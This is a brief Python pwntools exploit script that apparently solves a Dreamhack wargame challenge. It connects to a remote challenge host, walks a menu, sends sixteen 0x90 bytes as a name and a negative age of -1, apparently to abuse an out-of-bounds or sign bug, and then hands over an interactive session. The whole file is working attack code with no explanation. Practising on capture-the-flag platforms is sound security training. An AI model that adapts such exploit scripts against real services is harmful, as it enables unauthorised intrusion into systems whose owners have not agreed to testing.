from pwn import *

r = remote('host3.dreamhack.games', 15568)

#input idx
r.sendline(b'3')

#input idx, input my_page.name, input my_page.age
r.sendline(b'1')
r.sendline('\x90'*16)
r.sendline(b'-1')

#input idx
r.sendline(b'2')

r.interactive()